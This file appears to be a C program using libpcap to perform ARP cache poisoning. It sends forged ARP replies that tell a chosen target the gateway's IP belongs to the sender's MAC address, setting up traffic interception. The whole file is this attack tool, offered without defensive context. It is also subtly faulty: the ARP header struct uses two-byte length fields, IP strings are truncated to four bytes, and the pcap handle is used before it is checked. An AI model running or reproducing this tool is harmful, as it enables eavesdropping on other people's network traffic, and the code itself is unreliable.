#define _BSD_SOURCE
#include <sys/socket.h>
#include <arpa/inet.h>
#include <pcap.h>
#include <pcap/pcap.h>
#include <stdio.h>
#include <net/ethernet.h>
#include <stdlib.h>
#include <string.h>
#include <linux/posix_types.h>
#include <net/if.h>
#include <linux/rtnetlink.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <netinet/in.h>

#define ETH_HDRLEN 14
#define ARP_HDRLEN 28
#define ARPOP_REQUEST 1
#define ARPOP_REPLY 2
#define TYPE_ETH 1
#define IPv4 0x800
#define HDR_SZ 6
#define PRT_SZ 4
#define BUFSIZE 8192
struct arp_header
{
   uint16_t ar_hrd;
   uint16_t ar_pro;
   uint16_t ar_hln;
   uint16_t ar_pln;
   uint16_t ar_op;

   uint8_t arp_sha[6];
   uint32_t arp_spa;
   uint8_t arp_tha[6];
   uint32_t arp_tpa;
};

struct route_info
{
   struct in_addr dstAddr;
   struct in_addr srcAddr;
   struct in_addr gateWay;
   char ifName[IF_NAMESIZE];

};

u_char Rframe[ETH_HDRLEN+ARP_HDRLEN];
u_char frame[ETH_HDRLEN+ARP_HDRLEN];

struct arp_header *arpR = (struct arp_header *)(Rframe+14);
struct arp_header *arpF = (struct arp_header *)(frame+14);

pcap_t* handle;
char addr[20];

void Make_Header(void * data);
void GetMacAddress(char *dev);
char * GetIpAddress(char *dev);
char *gateway;
char *targetip;
uint8_t mac_addr[6];
char ip_addr[4];
int main(int argc, char* argv[])
{
   struct pcap_pkthdr* header;
   
   const u_char* packet;
   char *dev = argv[1];
   char errbuf[PCAP_ERRBUF_SIZE];
   GetMacAddress(dev);
   GetIpAddress(dev);
   targetip = argv[2];
   gateway = argv[3];
   printf("ip address : %s\n",ip_addr);
   printf("target ip : %s\n",targetip); 

   memcpy(Rframe,"\xFF\xFF\xFF\xFF\xFF\xFF",6); //input DEST mac
   memcpy(Rframe+6,mac_addr,6); //input SRC mac
   memcpy(Rframe+12, "\x08", 1);
   memcpy(Rframe+13, "\x06", 1);
   arpR->ar_hrd = htons(TYPE_ETH);
   arpR->ar_pro = htons(IPv4);
   arpR->ar_hln = HDR_SZ;
   arpR->ar_pln = PRT_SZ;
   arpR->ar_op = htons(ARPOP_REQUEST);
   inet_pton(AF_INET,ip_addr,&arpR->arp_spa);
   inet_pton(AF_INET,targetip,&arpR->arp_tpa);   
   
   printf("[DEBUG] ");
   for (int i=0; i<42; i++)
         printf("%02x ",Rframe[i]);
   printf("\n");


   handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
   pcap_sendpacket(handle,Rframe,sizeof(Rframe));
   if (handle == NULL)
   {
	fprintf(stderr, "couldn't open device %s: %s\n",dev,errbuf);
   }
   while(1)
   {
   int res = pcap_next_ex(handle, &header, &packet);
   if (res == 0) continue;
   if (res == -1 || res == -2) break;
   struct ether_header* ehPs = (struct ether_header *)(void *)packet;
   if(ntohs(ehPs->ether_type) == ETHERTYPE_ARP)
     Make_Header((void *) packet);
   } 
   return 0;
}

void Make_Header(void * data)
{
  struct ether_header* ehPS = (struct ether_header *)data;
  struct arp_header* arpS = (struct arp_header *)(sizeof(struct ether_header)+data);
  
  memcpy(frame,ehPS->ether_shost,6); //input DEST mac
  memcpy(frame+6,mac_addr,6); //input SRC mac
  memcpy(frame+12, "\x08", 1);
  memcpy(frame+13, "\x06", 1);

  arpF->ar_hrd = htons(TYPE_ETH);
  arpF->ar_pro = htons(IPv4);
  arpF->ar_hln = HDR_SZ;
  arpF->ar_pln = PRT_SZ;
  arpF->ar_op = htons(ARPOP_REPLY);
  
  memcpy(arpF->arp_tha,arpS->arp_sha,6);
  memcpy(arpF->arp_sha,(void *)mac_addr,6);

  inet_pton(AF_INET,gateway,&arpF->arp_spa);
  inet_pton(AF_INET,targetip,&arpF->arp_tpa);
  
  printf("[DEBUG] ");
  for (int i=0; i<42; i++)
        printf("%02x ",frame[i]);
  printf("\n");
  if(pcap_sendpacket(handle,frame, sizeof(frame))!=0)
  {
    printf("False\n");
    exit(0);
  }
  else
  {
    printf("Success!");
  }
}

void GetMacAddress(char *dev)
{
   struct ifreq s;
   int fd = socket(PF_INET, SOCK_DGRAM, IPPROTO_IP);
  
   strcpy(s.ifr_name,dev);
   if (ioctl(fd, SIOCGIFHWADDR, &s)==0)
   {
	memcpy(mac_addr,s.ifr_addr.sa_data,6);
   }
}

char * GetIpAddress(char *dev)
{
   struct ifreq ifr;
   char ipstr[20];
   int s;
   s = socket(AF_INET, SOCK_DGRAM, 0);
   strncpy(ifr.ifr_name, dev, IFNAMSIZ);

   if (ioctl(s, SIOCGIFADDR, &ifr) < 0) 
   {
	printf("Error");
   }
   else
   {
	inet_ntop(AF_INET, ifr.ifr_addr.sa_data+2, ipstr, sizeof(struct sockaddr));
	memcpy(ip_addr,ipstr,4);
   }
}
